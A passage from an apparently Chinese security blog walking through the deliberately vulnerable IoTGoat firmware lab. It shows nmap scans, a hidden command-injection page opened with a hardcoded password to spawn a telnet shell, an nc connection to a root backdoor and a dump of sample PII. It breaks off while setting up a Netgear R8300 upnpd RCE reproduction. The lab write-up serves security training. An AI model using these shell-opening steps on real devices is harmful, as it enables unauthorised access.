class="hljs-variable">%r(Gen</span><br><span class="hljs-variable">SF:ericLines,124,&quot;\x20501\x20Not\x20Implemented\r\nContent-Type:\x20text/h</span><br><span class="hljs-variable">SF:tml\r\nConnection:\x20close\r\nContent-Length:\x20149\r\nServer:\x20Ope</span><br><span class="hljs-variable">SF:nWRT/18\.06\.2\x20UPnP/1\.1\x20MiniUPnPd/2\.1\r\nExt:\r\n\r\n&lt;HTML&gt;&lt;HEA</span><br><span class="hljs-variable">SF:D&gt;&lt;TITLE&gt;501\x20Not\x20Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not\x20Imple</span><br><span class="hljs-variable">SF:mented&lt;/H1&gt;The\x20HTTP\x20Method\x20is\x20not\x20implemented\x20by\x20t</span><br><span class="hljs-variable">SF:his\x20server\.&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;)%</span>r(GetRequest,117,&quot;HTTP/1<span class="hljs-symbol">\.</span>0<span class="hljs-symbol">\x</span>20404\<br>SF:x20Not<span class="hljs-symbol">\x</span>20Found<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Type:<span class="hljs-symbol">\x</span>20text/html<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Connection:<span class="hljs-symbol">\x</span>20close<span class="hljs-symbol">\r</span><br>SF:<span class="hljs-symbol">\n</span>Content-Length:<span class="hljs-symbol">\x</span>20134<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Server:<span class="hljs-symbol">\x</span>20OpenWRT/18<span class="hljs-symbol">\.</span>06<span class="hljs-symbol">\.</span>2<span class="hljs-symbol">\x</span>20UPnP/1<span class="hljs-symbol">\.</span>1<span class="hljs-symbol">\x</span><br>SF:20MiniUPnPd/2<span class="hljs-symbol">\.</span>1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>[SNIP]<br>&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not<span class="hljs-symbol">\x</span>20Implemented&lt;<br>SF:/H1&gt;The<span class="hljs-symbol">\x</span>20HTTP<span class="hljs-symbol">\x</span>20Method<span class="hljs-symbol">\x</span>20is<span class="hljs-symbol">\x</span>20not<span class="hljs-symbol">\x</span>20implemented<span class="hljs-symbol">\x</span>20by<span class="hljs-symbol">\x</span>20this<span class="hljs-symbol">\x</span>20<br>SF:server<span class="hljs-symbol">\.</span>&lt;/BODY&gt;&lt;/HTML&gt;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&quot;);<br>MAC Address: 00:0C:29:00:AC:E7<br></code></pre></td></tr></table></figure><p>Analyze the service detection response details and note information such as the service version (<code>MiniUPnP 2.1</code>), server version (<code>OpenWrt 18.06.2</code>), as well as the error code details. Proceed with interrogating each listening services with aggressive scripts that aid in vulnerability identification based on service versioning. Try searching for appropriate <code>nmap scripts</code> in Kali Linux under <code>/usr/share/nmap/scripts</code> directory. A <code>upnp</code> example using <code>broadcast-upnp-info</code> script is shown below.</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs coq">nmap -sV --script=broadcast-upnp-info <span class="hljs-number">172.16</span><span class="hljs-number">.100</span><span class="hljs-number">.213</span><br>Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-04</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span> EDT<br>Pre-scan script results:<br>| <span class="hljs-type">broadcast</span>-upnp-info: <br>|   <span class="hljs-type">239</span><span class="hljs-number">.255</span><span class="hljs-number">.255</span><span class="hljs-number">.250</span><br>|       <span class="hljs-type">Server</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|       <span class="hljs-type">Location</span>: http://<span class="hljs-number">192.168</span><span class="hljs-number">.50</span><span class="hljs-number">.143</span>:<span class="hljs-number">5000</span>/rootDesc.xml<br>|         <span class="hljs-type">Webserver</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|         <span class="hljs-type">Name</span>: OpenWRT router<br>|         <span class="hljs-type">Manufacturer</span>: OpenWRT<br>|         <span class="hljs-type">Model</span> Descr: OpenWRT router<br>|         <span class="hljs-type">Model</span> Name: OpenWRT router<br>|         <span class="hljs-type">Model</span> Version: <span class="hljs-number">1</span><br>|         <span class="hljs-type">Name</span>: WANDevice<br>|         <span class="hljs-type">Manufacturer</span>: MiniUPnP<br>|         <span class="hljs-type">Model</span> Descr: WAN Device<br>|         <span class="hljs-type">Model</span> Name: WAN Device<br>|         <span class="hljs-type">Model</span> Version: <span class="hljs-number">20190130</span><br>|         <span class="hljs-type">Name</span>: WANConnectionDevice<br>|         <span class="hljs-type">Manufacturer</span>: MiniUPnP<br>|         <span class="hljs-type">Model</span> Descr: MiniUPnP daemon<br>|         <span class="hljs-type">Model</span> Name: MiniUPnPd<br>|<span class="hljs-type">_</span>        Model Version: <span class="hljs-number">20190130</span><br>[SNIP]<br>Nmap scan report <span class="hljs-keyword">for</span> IoTGoat (<span class="hljs-number">192.168</span><span class="hljs-number">.50</span><span class="hljs-number">.143</span>)<br>Host is up (<span class="hljs-number">0.00045</span>s latency).<br>Not shown: <span class="hljs-number">995</span> closed ports<br>PORT     STATE SERVICE  VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh      Dropbear sshd (protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">53</span>/tcp   open  domain   dnsmasq <span class="hljs-number">2.73</span><br><span class="hljs-number">80</span>/tcp   open  http     LuCI Lua http config<br><span class="hljs-number">443</span>/tcp  open  ssl/http LuCI Lua http config<br><span class="hljs-number">5000</span>/tcp open  upnp     MiniUPnP <span class="hljs-number">2.1</span> (UPnP <span class="hljs-number">1.1</span>)<br>| <span class="hljs-type">fingerprint</span>-strings: <br>|   <span class="hljs-type">FourOhFourRequest</span>, GetRequest: <br>|     <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.0</span> <span class="hljs-number">404</span> Not Found<br>|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/html<br>|     <span class="hljs-type">Connection</span>: close<br>|     <span class="hljs-type">Content</span>-Length: <span class="hljs-number">134</span><br>|     <span class="hljs-type">Server</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|     <span class="hljs-type">Ext</span>:<br>|     <span class="hljs-type">&lt;HTML</span>&gt;&lt;HEAD&gt;&lt;TITLE&gt;<span class="hljs-number">404</span> Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Found&lt;/H1&gt;The requested URL was not found on this server.&lt;/BODY&gt;&lt;/HTML&gt;<br>|   <span class="hljs-type">GenericLines</span>: <br>|     <span class="hljs-type">501</span> Not Implemented<br>|     <span class="hljs-type">Content</span>-<span class="hljs-keyword">Type</span>: text/html<br>|     <span class="hljs-type">Connection</span>: close<br>|     <span class="hljs-type">Content</span>-Length: <span class="hljs-number">149</span><br>|     <span class="hljs-type">Server</span>: OpenWRT/<span class="hljs-number">18.06</span><span class="hljs-number">.2</span> UPnP/<span class="hljs-number">1.1</span> MiniUPnPd/<span class="hljs-number">2.1</span><br>|     <span class="hljs-type">Ext</span>:<br>|     <span class="hljs-type">&lt;HTML</span>&gt;&lt;HEAD&gt;&lt;TITLE&gt;<span class="hljs-number">501</span> Not Implemented&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Not Implemented&lt;/H1&gt;The HTTP Method is not implemented <span class="hljs-built_in">by</span> this server.&lt;/BODY&gt;&lt;/HTML&gt;<br>|   <span class="hljs-type">HTTPOptions</span>: <br>[SNIP] <br></code></pre></td></tr></table></figure></blockquote><h2 id="No-3-Insecure-Ecosystem-Interfaces"><a href="#No-3-Insecure-Ecosystem-Interfaces" class="headerlink" title="No 3: Insecure Ecosystem Interfaces:"></a>No 3: Insecure Ecosystem Interfaces:</h2><h3 id="隐藏的web-shell"><a href="#隐藏的web-shell" class="headerlink" title="隐藏的web shell"></a>隐藏的web shell</h3><p>在web服务器config文件<code>./etc/config/uhttpd</code>可以看到<code>lua_prefix</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kali<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/Desktop/IoTGoat/_IoTGoat-x86</span>.img.extracted/squashfs-root<span class="hljs-variable">$ </span>cat ./etc/config/uhttpd | grep <span class="hljs-string">&quot;/&quot;</span><br>        option home             /www<br>        option cert             /etc/uhttpd.crt<br>        option key              /etc/uhttpd.key<br>        <span class="hljs-comment"># Default is /cgi-bin</span><br>        option cgi_prefix       /cgi-bin<br>        list lua_prefix         <span class="hljs-string">&quot;/cgi-bin/luci=/usr/lib/lua/luci/sgi/uhttpd.lua&quot;</span><br></code></pre></td></tr></table></figure><p>这个lua_prefix是用来跳转到对应文件的，可参考<a href="https://blog.csdn.net/qq_26202991/article/details/102621184">这里</a></p><p>然后在<code>./usr/lib/lua/luci/</code>可以看见</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">├───<span class="hljs-keyword">cbi</span><br>├───controller<br>│   ├───admin<br>│   └───iotgoat<br>│   ├───<span class="hljs-keyword">cbi</span><br>│   │   ├───admin_network<br>│   │   ├───admin_status<br>│   │   ├───admin_system<br>│   │   │   └───fstab<br>│   │   ├───firewall<br>│   │   └───upnp<br>│   └───network<br>├───sgi<br>├───sys<br>│   └───zoneinfo<br>├───template<br>├───tools<br>    ├───admin_network<br>    │   └───index<br>    ├───admin_system<br>    ├───admin_uci<br>    ├───<span class="hljs-keyword">cbi</span><br>    ├───firewall<br>    ├───iotgoat<br>        └───bootstrap<br></code></pre></td></tr></table></figure><p>在<code>controller/iotgoat/iotgoat.lua</code>中可以看到index函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>&#125;, firstchild(), <span class="hljs-string">&quot;IoTGoat&quot;</span>, <span class="hljs-number">60</span>).dependent=<span class="hljs-literal">false</span><br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;cmdinject&quot;</span>&#125;, template(<span class="hljs-string">&quot;iotgoat/cmd&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">1</span>)<br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;cam&quot;</span>&#125;, template(<span class="hljs-string">&quot;iotgoat/camera&quot;</span>), <span class="hljs-string">&quot;Camera&quot;</span>, <span class="hljs-number">2</span>)<br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;door&quot;</span>&#125;, template(<span class="hljs-string">&quot;iotgoat/door&quot;</span>), <span class="hljs-string">&quot;Doorlock&quot;</span>, <span class="hljs-number">3</span>)<br>    entry(&#123;<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;iotgoat&quot;</span>, <span class="hljs-string">&quot;webcmd&quot;</span>&#125;, call(<span class="hljs-string">&quot;webcmd&quot;</span>))<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>在<code>view/iotgoat/</code>里有<code>cmd.html</code></p><p>所以访问<code>https://&lt;IoTGoat_IP&gt;/cgi-bin/luci/admin/iotgoat/cmdinject</code>即可</p><p>需要登陆密码，<code>iotgoathardcodedpassword</code></p><p>在cmd中输入<code>telnet -p 9999</code>，linux nc即可连入</p><blockquote><p>更多有关luci可以参考</p><p><a href="https://www.cnblogs.com/x_wukong/p/4505240.html">luci框架-LUA的一个web框架使用</a></p><p><a href="https://github.com/openwrt/luci/wiki">openwrt luci的wiki</a></p></blockquote><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>前面有个5515端口是未知的，nc连一下居然是后门。。</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tcl">nc <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.102</span> <span class="hljs-number">5515</span><br>[***]Successfully Connected to IoTGoat&#x27;s Backdoor[***]<br><br>ls<br>bin<br>boot<br>dev<br>dnsmasq_setup.sh<br>etc<br>lib<br>mnt<br>overlay<br><span class="hljs-keyword">proc</span><br>rom<br>root<br>sbin<br>sys<br>tmp<br>usr<br>var<br>www<br><br>id<br>uid=0(root)<span class="hljs-title"> gid=0(root)</span><br></code></pre></td></tr></table></figure><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Network/Firewall/Traffic Rules里</p><p>New forward rule 、 New source NAT 的Name 有XSS</p><blockquote><p>快速了解：<a href="https://zhuanlan.zhihu.com/p/26177815">浅谈XSS攻击的那些事（附常用绕过姿势）</a></p></blockquote><h2 id="No-4-Lack-of-Secure-Update-Mechanism"><a href="#No-4-Lack-of-Secure-Update-Mechanism" class="headerlink" title="No 4: Lack of Secure Update Mechanism:"></a>No 4: Lack of Secure Update Mechanism:</h2><h3 id="Insecure-package-update-configuration-defaults-including-CVE-2020-7982"><a href="#Insecure-package-update-configuration-defaults-including-CVE-2020-7982" class="headerlink" title="Insecure package update configuration defaults including CVE-2020-7982."></a>Insecure package update configuration defaults including CVE-2020-7982.</h3><p><a href="https://www.anquanke.com/post/id/202039">OPENWRT中的远程命令执行漏洞（CVE-2020-7982）[CN]</a></p><h2 id="No-5-Use-of-Insecure-or-Outdated-Components"><a href="#No-5-Use-of-Insecure-or-Outdated-Components" class="headerlink" title="No 5: Use of Insecure or Outdated Components:"></a>No 5: Use of Insecure or Outdated Components:</h2><h3 id="Several-insecure-and-outdated-software-components-with-CVEs-such-as-Dnsmasq-pppd-Linux-Kernel-BusyBox-wpa-supplicant-and-more"><a href="#Several-insecure-and-outdated-software-components-with-CVEs-such-as-Dnsmasq-pppd-Linux-Kernel-BusyBox-wpa-supplicant-and-more" class="headerlink" title="Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more."></a>Several insecure and outdated software components with CVEs such as Dnsmasq, pppd, Linux Kernel, BusyBox, wpa_supplicant, and more.</h3><p>Todo: auto scan</p><p>TLS 1.2</p><p>ssh 2.0</p><p>pppd 2.4.7</p><p>Dnsmasq 2.73</p><p>wpa_supplicant v2.7-devel</p><p>BusyBox v1.28.4</p><h2 id="No-6-Insufficient-Privacy-Protection"><a href="#No-6-Insufficient-Privacy-Protection" class="headerlink" title="No 6: Insufficient Privacy Protection:"></a>No 6: Insufficient Privacy Protection:</h2><h3 id="PII-data-captured-and-stored-insecurely"><a href="#PII-data-captured-and-stored-insecurely" class="headerlink" title="PII data captured and stored insecurely."></a>PII data captured and stored insecurely.</h3><p>Personally identifiable information (PII)</p><p>firmwalker搜索的db文件</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">##################################### *.db<br>/usr/lib/lua/luci/controller/iotgoat/sensordata.db<br></code></pre></td></tr></table></figure><p>然后使用sqlite3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>@kali:~/Desktop/IoTGoat/_IoTGoat-x<span class="hljs-number">86</span>.img.extracted/squashfs-root/usr/lib/lua/luci/controller/iotgoat$ sqlite<span class="hljs-number">3</span> sensordata.db <br><span class="hljs-attribute">SQLite</span> version <span class="hljs-number">3</span>.<span class="hljs-number">32</span>.<span class="hljs-number">3</span> <span class="hljs-number">2020</span>-<span class="hljs-number">06</span>-<span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">33</span><br><span class="hljs-attribute">Enter</span> <span class="hljs-string">&quot;.help&quot;</span> for usage hints.<br><span class="hljs-attribute">sqlite</span>&gt; .dump<br><span class="hljs-attribute">PRAGMA</span> foreign_keys=<span class="hljs-literal">OFF</span>;<br><span class="hljs-attribute">BEGIN</span> TRANSACTION;<br><span class="hljs-attribute">CREATE</span> TABLE sensors(id INTEGER PRIMARY KEY AUTOINCREMENT, temperature NUMERIC, humidity NUMERIC, currentdate DATE, currentime TIME, name TEXT, email TEXT, birthdate NUMERIC);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">1</span>,<span class="hljs-number">22</span>.<span class="hljs-number">399999999999998579</span>,<span class="hljs-number">68</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">33</span>&#x27;,&#x27;johnsmith&#x27;,&#x27;johnsmith@gmail.com&#x27;,<span class="hljs-number">1311977</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">2</span>,<span class="hljs-number">29</span>.<span class="hljs-number">699999999999999289</span>,<span class="hljs-number">98</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">56</span>:<span class="hljs-number">43</span>&#x27;,&#x27;jillsmith&#x27;,&#x27;jillsmith@gmail.com&#x27;,<span class="hljs-number">4141979</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">3</span>,<span class="hljs-number">31</span>.<span class="hljs-number">199999999999999289</span>,<span class="hljs-number">28</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">57</span>:<span class="hljs-number">05</span>&#x27;,&#x27;walter&#x27;,&#x27;waltergary@yopmail.com&#x27;,<span class="hljs-number">32821969</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">4</span>,<span class="hljs-number">16</span>.<span class="hljs-number">899999999999998578</span>,<span class="hljs-number">38</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">57</span>:<span class="hljs-number">20</span>&#x27;,&#x27;WilliamRonald&#x27;,&#x27;billronald@yopmail.com&#x27;,<span class="hljs-number">11141989</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">5</span>,<span class="hljs-number">35</span>,<span class="hljs-number">78</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">58</span>:<span class="hljs-number">04</span>&#x27;,&#x27;Test&#x27;,&#x27;TstUser@aol.com&#x27;,<span class="hljs-number">12121990</span>);<br><span class="hljs-attribute">INSERT</span> INTO sensors VALUES(<span class="hljs-number">6</span>,<span class="hljs-number">35</span>,<span class="hljs-number">88</span>,&#x27;<span class="hljs-number">2020</span>-<span class="hljs-number">03</span>-<span class="hljs-number">24</span>&#x27;,&#x27;<span class="hljs-number">18</span>:<span class="hljs-number">58</span>:<span class="hljs-number">18</span>&#x27;,&#x27;Sgt&#x27;,&#x27;sgtmajor@us.gov&#x27;,<span class="hljs-number">10171956</span>);<br><span class="hljs-attribute">DELETE</span> FROM sqlite_sequence;<br><span class="hljs-attribute">INSERT</span> INTO sqlite_sequence VALUES(&#x27;sensors&#x27;,<span class="hljs-number">6</span>);<br><span class="hljs-attribute">COMMIT</span>;<br><span class="hljs-attribute">sqlite</span>&gt; <br><br></code></pre></td></tr></table></figure><h2 id="No-7-Insecure-Data-Transfer-and-Storage"><a href="#No-7-Insecure-Data-Transfer-and-Storage" class="headerlink" title="No 7: Insecure Data Transfer and Storage:"></a>No 7: Insecure Data Transfer and Storage:</h2><p><code>&lt;IP&gt;/cgi-bin/luci/admin/network/wireless/wl0.network1</code></p><p>wifi没有密码</p><h2 id="No-8-Lack-of-Device-Management"><a href="#No-8-Lack-of-Device-Management" class="headerlink" title="No 8: Lack of Device Management:"></a>No 8: Lack of Device Management:</h2><p><code>&lt;IP&gt;/cgi-bin/luci/admin/status/syslog</code>没有开启</p><h2 id="No-9-Insecure-Default-Settings"><a href="#No-9-Insecure-Default-Settings" class="headerlink" title="No 9: Insecure Default Settings:"></a>No 9: Insecure Default Settings:</h2><h3 id="Many-included-in-IoTGoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-CSRF-protections-on-sensitive-requests"><a href="#Many-included-in-IoTGoat-such-as-missing-secure-headers-to-prevent-framing-as-well-as-CSRF-protections-on-sensitive-requests" class="headerlink" title="Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests."></a>Many included in IoTGoat such as missing secure headers to prevent framing as well as CSRF protections on sensitive requests.</h3><blockquote><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><p>​    目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p><p><a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369">link</a></p></blockquote><h2 id="No-10-Lack-of-Physical-Hardening"><a href="#No-10-Lack-of-Physical-Hardening" class="headerlink" title="No 10: Lack of Physical Hardening:"></a>No 10: Lack of Physical Hardening:</h2><p>物理强化，应该是指对固件的保护</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Netgear Nighthawk R8300 upnpd PreAuth RCE 复现辅助</title>
    <link href="/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/"/>
    <url>/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/</url>
    
    <content type="html"><![CDATA[<p>小声：因为nvram那里我实在搞不定了，如果有愿意帮忙的师傅欢迎联系！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130">固件下载地址</a></p><p>md5sum</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c3eb8f8c004d466796a05b4c60503162</span>  R<span class="hljs-number">8300</span>-V<span class="hljs-number">1.0.2.130</span>_<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">99</span>.zip<br></code></pre></td></tr></table></figure><p>binwalk</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">binwalk R8300-V1.0.2.130_1.0.99.chk <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>58            0x3A            TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x0<br>86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes<br>2206602       0x21AB8A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38<br></code></pre></td></tr></table></figure><p>查找upnpd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">iot@attifyos ~/t/f/_/_R8300-V1.0.2.130_1.0.99.chk.extracted&gt; <span class="hljs-built_in">cd</span> squashfs-root/<br>iot@attifyos ~/t/f/_/_/squashfs-root&gt; ls<br>bin/  etc/  media@  opt/   sbin/   sys/  usr/  www/<br>dev/  lib/  mnt/    proc/  share/  tmp/  var@<br>iot@attifyos ~/t/f/_/_/squashfs-root&gt; find . -name upnpd<br>./usr/sbin/upnpd<br>iot@attifyos ~/t/f/_/_/squashfs-root&gt; file ./usr/sbin/upnpd<br>./usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped<br></code></pre></td></tr></table></figure><h3 id="fat模拟"><a href="#fat模拟" class="headerlink" title="fat模拟"></a>fat模拟</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">./fat.py R8300-V1.0.2.130_1.0.99.zip <br><br>                               __           _<br>                              / _|<span class="hljs-string">         </span>|<span class="hljs-string"> </span>|<br>                             |<span class="hljs-string"> </span>|<span class="hljs-string">_    __ _  </span>|<span class="hljs-string"> </span>|_<br>                             |<span class="hljs-string">  _</span>|<span class="hljs-string">  / _` </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> __</span>|<br>                             |<span class="hljs-string"> </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|_<br>                             |<span 